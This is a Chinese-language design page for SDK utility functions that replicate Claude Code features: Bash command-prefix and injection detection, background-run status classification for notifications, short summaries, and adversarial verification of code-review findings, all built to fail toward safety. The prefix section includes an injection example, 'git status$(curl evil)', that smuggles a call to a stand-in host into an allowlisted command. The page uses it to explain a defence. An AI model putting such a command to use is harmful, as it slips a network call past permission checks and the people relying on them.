Harness 侧工具函数

Claude Code 的一批「黑盒产品功能」在 SDK 里被复刻成 opt-in 独立函数——命名会话、推手机通知、挑记忆、判权限、code-review 核验。agent loop 一个都不自动触发（唯一自动的是上下文压缩）；host 在自己的产品生命周期点上按需调。全部默认 claude-haiku-4-5、单发、温度 0、失败朝安全。

共用实现 DNA runUtilityCall 底座

8 个函数（+ verifier）全是同一个 runUtilityCall（generators/runtime.ts）薄封装。理解这 6 条，就理解了全部。

1

单发 · 无工具 · temperature=0

每个都是一次 Messages API 调用，system + user 一问一答，温度钉 0 → 同输入同标签、可复现。不挂任何工具（runtime.ts:92）。

2

廉价 Haiku 默认，可覆盖

机械单轮活默认 claude-haiku-4-5，opts.model 可换（这正是接 SDK 函数会吃到的那颗地雷）。

3

忠实复刻 prompt + 硬化纯解析器

system 是对账过的官方复刻文本（faithful:true）；出参交给一个零 I/O、可单测的纯解析器（parseXxx）。

4

失败一律朝「安全」方向

注入→闭合、后台→不打扰、记忆→不附、判定→REFUTED。乱码/半截回复永不造成危险后果。

5

import-only · 自建 transport

模块无副作用，从公开 options 自建 transport → 可在 live query() 之外单独触发（会话开始前先命名、通知层判已结束的后台 run）；transport 可注入 → 离线零网络单测。

6

abort 朝「响亮」失败

流中取消一律 reject、绝不返回半截文本——否则 detectCommandPrefix 可能把截断片段当良性前缀交回（runtime.ts:101）。

命令前缀检测detectCommandPrefix(command, opts?)
Haiku · 128 tok
→ { kind:'prefix', prefix } | { kind:'none' } | { kind:'injection' }
src/generators/index.ts:65 触发：Bash 权限白名单匹配时——判断某命令是否命中用户已允许的前缀规则
功能

提取一条 Bash 命令「可加白名单的字符串前缀」，或判定命令注入。三态出参。

实现
  • 单发 COMMAND_PREFIX_SYSTEM（含 policy_spec + 大量 example 映射）。
  • 纯解析器 parseCommandPrefix 失败即闭合：空回复 / 多行回复一律判 injection——第 1 行的良性前缀绝不能掩盖第 2 行的注入。
  • sentinel 比较容忍大小写 / 尾标点；真前缀原样返回（大小写敏感——GOEXPERIMENT=synctest go test 这类环境变量前缀不被小写化）。
体验

撑起权限白名单：用户允许了 git commit，新的 git commit -m ... 自动命中放行；而 git status$(curl evil) 判为注入 → 回退人工确认，绝不因「前缀相同」被静默放行。安全价值全在「失败朝闭合」。

后台状态分类classifyBackgroundState({ tail, previousState? }, opts?)
Haiku · 512 tok
→ { state, detail, tempo, needs?, output }
src/generators/index.ts:138 触发：用户手机 / 网页后台挂起 run 后走开，通知层周期性判尾部
功能

把后台 run 记录尾部判为 working / blocked / done / failed，附锁屏一行 detail、tempo、needs、交付物 headline。驱动手机通知——只有 blocked 才推。

实现
  • 单发 BACKGROUND_STATE_SYSTEM（超长 few-shot，专攻 done-vs-blocked-vs-working 的边界）。
  • 把 previousState 织进 prompt 走「黏性规则」（done→working 不迁移，除非明确重启）。
  • parseBackgroundState 朝「不打扰」失败：乱码回复 → done（通知门只在 blocked 推，故绝不凭空造一次打扰）；state / tempo 都对白名单集校验。
体验

你在手机上把一个 run 挂后台走开——只有当 agent 真被你卡住（需你输入）时才推提醒，它在顺利干活或已干完时都不打扰你。detail 就是锁屏那一行「同事 Slack 口吻」的话（点名文件 / 数字 / 发现）。

功能

从描述同时产简洁标题 + claude/ 前缀的 kebab-case git 分支。

实现

离开回顾generateAwaySummary(tail, opts?)
Haiku · 128 tok
→ string（<40 词、1–2 句、无 markdown）

功能

从记录尾部产不到 40 词、1–2 句朴素回顾。

对抗性核验adversarialVerify(finding, opts?)
Haiku · 512 tok
→ { verdict, keep, quote?, rationale, confirms? }
src/verifier/index.ts:105 触发：/code-review 技能的核验阶段——逐条候选发现复核
功能

把一条候选 code-review 发现判为 CONFIRMED / PLAUSIBLE / REFUTED 三态，编码「保留非 REFUTED」为 keep 标志。召回偏置（默认 PLAUSIBLE）。

实现
  • buildVerifierUserTurn 拼 diff / 位置 / 类别为证据；runVerification 单发 VERIFY_VERDICT_SYSTEM，model = opts.model ?? Haiku。
  • parseVerdict 失败朝闭合：JSON 回复权威、verdict 字段缺失 / 非法 → REFUTED（绝不从 rationale 散文里捞一个 verdict 词伪造保留）。
  • 半截 JSON（max_tokens 截断）也判 REFUTED；只有「完全无花括号」才当裸词判定，且必须恰好一个 verdict 词、歧义 → REFUTED。
体验

/code-review 的核验闸——每条候选 bug 被对抗性复核：假阳（REFUTED）丢弃、真的 / 不确定的（CONFIRMED / PLAUSIBLE）保留。召回偏置让它不过度否掉现实可达的 bug；「不测不宣胜负」——没证成的发现不靠「疑罪从有」存活。
